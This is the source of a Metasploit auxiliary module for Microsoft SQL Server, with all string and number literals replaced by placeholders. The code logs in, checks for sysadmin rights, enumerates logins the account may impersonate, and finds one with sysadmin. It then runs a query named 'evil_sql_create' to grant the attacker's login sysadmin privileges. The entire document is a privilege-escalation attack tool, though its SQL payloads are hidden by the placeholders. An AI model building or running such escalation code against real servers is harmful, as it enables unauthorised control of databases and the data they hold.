require <str> require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: MSSQL def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] ] ) ) end def run print_status ( <str> rhost <str> rport <str> datastore [ <str> ] <str> ) if mssql_login_datastore print_good ( <str> ) else print_error ( <str> ) disconnect return end print_status ( <str> datastore [ <str> ] <str> ) user_status = check_sysadmin if user_status == <int> print_good ( <str> datastore [ <str> ] <str> ) disconnect return else print_status ( <str> ) end print_status ( <str> ) imp_user_list = check_imp_users if imp_user_list . nil? || imp_user_list . length == <int> print_error ( <str> ) disconnect return else print_good ( <str> imp_user_list . length <str> ) imp_user_list . each do | db | print_status ( <str> db [ <int> ] <str> ) end end print_status ( <str> ) imp_user_sysadmin = check_imp_sysadmin ( imp_user_list ) if imp_user_sysadmin . nil? print_error ( <str> ) disconnect return end print_status ( <str> imp_user_sysadmin [ <int> ] <str> ) escalate_status = escalate_privs ( imp_user_sysadmin [ <int> ] ) if escalate_status user_status = check_sysadmin if user_status == <int> print_good ( <str> datastore [ <str> ] <str> ) else print_error ( <str> ) end else print_error ( <str> ) end disconnect return end def check_sysadmin sql = <str> result = mssql_query ( sql ) parse_results = result [ <str> ] status = parse_results [ <int> ] [ <int> ] return status end def check_imp_users sql = <str> result = mssql_query ( sql ) return result [ <str> ] end def check_imp_sysadmin ( trust_db_list ) trust_db_list . each do | imp_user | sql = <str> imp_user [ <int> ] <str> result = mssql_query ( sql ) parse_results = result [ <str> ] status = parse_results [ <int> ] [ <int> ] if status == <int> print_good ( <str> imp_user [ <int> ] <str> ) return imp_user else print_status ( <str> imp_user [ <int> ] <str> ) end end nil end def escalate_privs ( imp_user_sysadmin ) evil_sql_create = <str> imp_user_sysadmin <str> datastore [ <str> ] <str> mssql_query ( evil_sql_create ) true end end 
